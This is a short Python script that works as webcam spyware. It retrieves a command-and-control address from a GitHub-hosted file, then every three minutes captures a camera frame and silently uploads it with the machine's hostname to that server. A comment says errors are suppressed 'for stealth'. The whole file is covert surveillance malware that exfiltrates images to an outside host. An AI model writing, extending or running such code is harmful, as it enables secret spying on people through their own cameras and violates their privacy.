import cv2
import requests
import time
import os
import socket

def get_c2_url():
    try:
        response = requests.get("https://github.com/PoopieRequim/pyc2config/blob/main/c2.txt", timeout=5)
        return response.text.strip()
    except:
        return None

def capture_and_send():
    try:
        c2 = get_c2_url()
        if not c2:
            return

        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()

        if ret:
            _, img_encoded = cv2.imencode('.jpg', frame)
            headers = {
                "X-Host": socket.gethostname(),
                "Content-Type": "application/octet-stream"
            }
            requests.post(c2, data=img_encoded.tobytes(), headers=headers)
    except Exception as e:
        pass  # silent fail for stealth

# Looping every 3 mins
while True:
    capture_and_send()
    time.sleep(180)  # 3 minutes
